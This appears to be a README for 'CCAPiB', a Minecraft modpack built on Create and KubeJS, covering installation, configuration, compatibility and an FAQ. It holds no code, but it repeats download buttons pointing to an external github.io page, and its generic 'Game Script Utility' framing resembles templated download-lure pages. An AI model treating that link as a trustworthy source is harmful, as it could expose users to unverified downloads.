# CCAPiB v2026 - Game Script Utility 2026

> **A Minecraft modpack built around guided progression.** It uses Create, KubeJS, and a structured gameplay route that moves through major Create-focused content in a deliberate order.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/scottethan25/ccapib-modpack-script-hub?style=flat-square)](https://github.com/scottethan25/ccapib-modpack-script-hub)

---

<p align="center">
  <a href="https://scottethan25.github.io/ccapib-modpack-script-hub/">
    <img src="https://img.shields.io/badge/Download-CCAPiB%20Script-brightgreen?style=for-the-badge" alt="Download CCAPiB Script">
  </a>
</p>

> **[Direct Download - CCAPiB](https://scottethan25.github.io/ccapib-modpack-script-hub/)**

---

[Download Latest Build](https://scottethan25.github.io/ccapib-modpack-script-hub/)

---

## Project Summary

CCAPiB is designed as a Minecraft modpack that narrows the usual open-ended flow into a more intentional progression path. Instead of presenting everything at once, it leans on Create-based systems and KubeJS logic to guide how the pack unfolds.

Its content path includes a chain of Create expansions such as Create: The Factory Must Grow, Create Metallurgy, Create Big Cannons, and Create Aeronautics. Together, these shape a pack that favors sequence, dependency, and a curated climb through the included modules.

## Script Highlights

- Structured progression that keeps the modpack moving in a defined order
- Create as the central gameplay backbone
- KubeJS scripts used to steer progression and pack behavior
- Includes Create: The Factory Must Grow
- Includes Create Metallurgy
- Includes Create Big Cannons
- Includes Create Aeronautics
- Built to present Create-related content in stages

## Installation

1. Download the latest build from the project download page.
2. Import or place the modpack in your Minecraft launcher or modpack manager.
3. Launch the pack using the Minecraft version and loader required by the included mod set.
4. If you are editing the pack locally, keep the KubeJS scripts in their expected folder structure so progression changes remain applied.

Minimal example for local organization:

- `CCAPiB-minecraft-modpack/`
  - `kubejs/`
  - `mods/`
  - `config/`

## Configuration

Rather than relying on a broad in-game options menu, the pack is shaped mainly by its mod selection and KubeJS scripts. Common places to adjust include:

| Setting Area | Purpose | Notes |
|---|---|---|
| KubeJS scripts | Progression logic | Controls how content is introduced |
| Mod list | Content scope | Determines which Create expansions are present |
| Config files | Gameplay tuning | Used for balance and pack behavior |
| Loader setup | Launch compatibility | Must match the Minecraft environment |

## Compatibility

CCAPiB is meant for Minecraft and centers on Create-driven modded gameplay. Actual compatibility depends on the Minecraft version, the mod loader, and the dependency set required by the included content.

Known constraints to keep in mind:

- The pack depends on Create and related addons.
- KubeJS-based changes require the pack to be loaded in a compatible environment.
- Unsupported mod versions or mismatched loader setups may prevent the pack from starting correctly.

## FAQ

**How do I install it?**  
Download the pack, then import it into your launcher or modpack manager, or place it in a local Minecraft instance using the expected folder layout.

**How do updates work?**  
Use the latest build from the download page and replace or merge files carefully if you have made local edits.

**Can I change progression?**  
Yes. The progression flow is handled through KubeJS, so you can adjust scripts if you are maintaining a custom version.

**What should I check if the pack does not launch?**  
Verify the Minecraft version, mod loader, and required mod dependencies. Also confirm that the KubeJS files are in the correct location.

**Does it need a special storage layout?**  
Keep the pack files organized in standard modpack folders such as `mods`, `config`, and `kubejs` so the setup remains readable and maintainable.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
